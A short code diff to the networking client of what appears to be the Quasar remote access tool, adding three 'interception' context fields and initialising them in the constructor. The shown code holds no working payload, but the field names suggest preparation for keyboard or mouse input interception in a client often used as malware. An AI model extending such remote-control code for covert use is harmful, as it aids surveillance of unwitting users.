@@ -239,6 +239,18 @@ namespace Quasar.Client.Networking
         private int _payloadLen;
         private ReceiveType _receiveState = ReceiveType.Header;
 
+
+        //Interception holders
+
+        // Token: 0x04000273 RID: 627
+        public IntPtr interceptionCtx;
+
+        // Token: 0x04000274 RID: 628
+        public int interceptionKID;
+
+        // Token: 0x04000275 RID: 629
+        public int interceptionMID;
+
         /// <summary>
         /// The mutex prevents multiple simultaneous write operations on the <see cref="_stream"/>.
         /// </summary>
@@ -252,6 +264,9 @@ namespace Quasar.Client.Networking
         {
             _serverCertificate = serverCertificate;
             _readBuffer = new byte[BUFFER_SIZE];
+            this.interceptionCtx = IntPtr.Zero;
+            this.interceptionKID = -1;
+            this.interceptionMID = -1;
             TypeRegistry.AddTypesToSerializer(typeof(IMessage), TypeRegistry.GetPacketTypes(typeof(IMessage)).ToArray());
         }
 
